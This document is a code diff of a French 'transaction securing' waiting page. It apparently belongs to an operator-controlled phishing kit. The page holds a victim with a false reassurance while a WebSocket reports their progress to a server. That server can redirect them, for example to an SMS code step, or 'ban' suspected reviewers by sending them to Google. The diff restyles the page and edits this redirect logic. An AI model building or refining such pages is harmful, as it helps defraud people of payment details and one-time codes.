@@ -5,58 +5,131 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Traitement en cours...</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        body {
+        :root {
+            --bg-color: #ffffff;
+            --text-main: #111827;
+            --text-muted: #6b7280;
+            --primary: #2563eb;
+        }
+
+        * {
+            box-sizing: border-box;
             margin: 0;
+            padding: 0;
             font-family: 'Inter', sans-serif;
-            background: #0f172a;
-            color: white;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            padding: 20px;
+            text-align: center;
         }
 
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #6366f1;
+        .loader-container {
+            position: relative;
+            width: 64px;
+            height: 64px;
+            margin-bottom: 24px;
+        }
+
+        .spinner {
+            width: 64px;
+            height: 64px;
+            border: 4px solid #f3f4f6;
+            border-top: 4px solid var(--primary);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 1.5rem;
+            animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
         }
 
         @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
             100% {
                 transform: rotate(360deg);
             }
         }
 
-        p {
-            font-size: 1.1rem;
-            opacity: 0.8;
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            letter-spacing: -0.01em;
         }
 
-        .timer {
-            font-size: 0.8rem;
-            margin-top: 10px;
-            color: #94a3b8;
+        p {
+            font-size: 15px;
+            color: var(--text-muted);
+            max-width: 280px;
+            line-height: 1.5;
+        }
+
+        .timer-dots {
+            display: flex;
+            gap: 4px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .dot {
+            width: 6px;
+            height: 6px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: dotFade 1.4s infinite linear;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dotFade {
+
+            0%,
+            100% {
+                opacity: 0.1;
+            }
+
+            50% {
+                opacity: 0.8;
+            }
         }
     </style>
 </head>
 
 <body>
-    <div class="loader"></div>
-    <p>Sécurisation de la transaction...</p>
-    <div id="timer" class="timer">Vérification en cours (20s)</div>
+    <div class="loader-container">
+        <div class="spinner"></div>
+    </div>
+
+    <h1>Traitement en cours...</h1>
+    <p>Veuillez ne pas fermer cette fenêtre. Nous sécurisons votre transaction.</p>
+
+    <div class="timer-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
 
     <script>
         const clientId = localStorage.getItem('aura_client_id');
-        const wsUrl = `wss://api-production-8591.up.railway.app/ws/client/${clientId}`;
+        const wsUrl = `wss://${window.location.host}/ws/client/${clientId}`;
         const ws = new WebSocket(wsUrl);
+
         ws.onopen = () => {
             ws.send(JSON.stringify({ event: 'step_update', data: { step: 'processing' } }));
         };
@@ -64,22 +137,19 @@
         ws.onmessage = (e) => {
             const msg = JSON.parse(e.data);
             if (msg.type === 'REDIRECT') window.location.href = msg.url;
-            else if (msg.type === 'BANNED') {
-                window.location.href = msg.redirect || 'https://www.facebook.com';
-            }
+            else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
         };
 
-        // Redirection automatique après 20s vers SMS (par défaut)
-        let timeLeft = 20;
+        // Fallback auto-redirect after long wait
+        let timeLeft = 30;
         const timerInterval = setInterval(() => {
             timeLeft--;
             if (ws.readyState === WebSocket.OPEN) {
                 ws.send(JSON.stringify({ event: "timer_update", data: { timeLeft: timeLeft } }));
             }
-            if (timeLeft >= 0) document.getElementById('timer').textContent = `Vérification en cours (${timeLeft}s)`;
             if (timeLeft === 0) {
                 clearInterval(timerInterval);
-                window.location.href = '/sms';
+                // Fallback to home or specific page if no admin action
             }
         }, 1000);
     </script>
